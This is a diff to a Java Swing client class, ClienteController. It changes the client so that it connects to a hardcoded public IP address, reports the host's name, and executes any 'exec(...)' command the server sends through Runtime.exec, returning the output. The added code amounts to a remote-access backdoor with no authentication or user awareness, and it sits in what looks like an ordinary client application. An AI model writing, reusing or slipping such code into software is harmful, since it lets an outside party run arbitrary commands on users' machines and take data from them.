@@ -1,13 +1,18 @@
 package br.com.enviador.controller;
 
 import java.awt.EventQueue;
+import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
+import java.net.InetAddress;
 import java.net.Socket;
 import java.net.UnknownHostException;
 
 import javax.swing.JFrame;
+
+import org.omg.CORBA.portable.InputStream;
 
 import br.com.enviador.model.Cliente;
 
@@ -16,11 +21,22 @@ public class ClienteController {
 
 	private Cliente cliente;
 	
-	public void tentandoConexao(){
-		
+	public void nomeDaMainaqua(){
 		this.cliente = new Cliente();
 		
-
+		String nome = "";  
+		try {
+		     nome = InetAddress.getLocalHost().getHostName();
+		      
+	    } catch (UnknownHostException e) {
+		      e.printStackTrace();
+	    }
+		this.cliente.setNome(nome);
+		
+		
+	}
+	public void tentandoConexao(){
+		
 		Thread tentandoConexao = new Thread(new Runnable() {
 			
 			@Override
@@ -30,7 +46,7 @@ public class ClienteController {
 					System.out.println("Tentativa "+tentativa);
 					
 					try {
-						Socket conexao = new Socket("localhost", 37389);
+						Socket conexao = new Socket("177.19.115.19", 37389);
 						processandoConexao(conexao);
 						break;
 					} catch (UnknownHostException e) {
@@ -72,7 +88,7 @@ public class ClienteController {
 				try {
 					saida = new ObjectOutputStream(conexao.getOutputStream());
 					saida.flush();
-					saida.writeObject("setNome(clienteTeste)");
+					saida.writeObject("setNome("+cliente.getNome()+")");
 					saida.flush();
 					
 					entrada = new ObjectInputStream(conexao.getInputStream());
@@ -114,10 +130,51 @@ public class ClienteController {
 						}
 					});
 				}
+				else if(mensagem.contains("exec")){
+					
+					String cmdString = mensagem.substring("exec(".length(), mensagem.length() - 1);
+					
+					try
+				      {
+				         Runtime rt = Runtime.getRuntime();
+				         
+
+				         System.out.println(cmdString);
+				         Process pr = rt.exec(cmdString);
+				         BufferedReader input = new BufferedReader(new InputStreamReader(
+				                                                   pr.getInputStream()));
+
+				         String line = null;
+				         String linhas = "";
+
+				         while ((line = input.readLine()) != null)
+				         {
+				        	 linhas += line;
+				         }
+
+				         int exitVal = pr.waitFor();
+				         linhas += "Erro:  " + exitVal;
+				         cliente.getSaida().flush();
+				         cliente.getSaida().writeObject(linhas);
+				         
+				         
+
+				      }
+				      catch (Exception e)
+				      {
+				         System.out.println(e.toString());
+				         e.printStackTrace();
+				      }
+			            
+			        
+					
+					
+				}
 				
 			}
 		});
 		processando.start();
 	}
+
 	
 }
